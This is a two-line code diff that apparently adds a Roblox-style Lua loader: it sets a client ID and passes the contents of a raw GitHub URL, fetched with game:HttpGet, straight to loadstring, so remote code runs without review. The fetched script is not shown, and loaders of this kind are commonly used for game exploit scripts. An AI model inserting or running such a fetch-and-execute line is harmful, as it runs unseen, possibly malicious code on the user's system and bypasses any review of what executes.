@@ -1,0 +1,2 @@
+CLIENT_ID = "5da2740cc8064ac4"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x-scripts/refs/heads/main/script.lua"))()
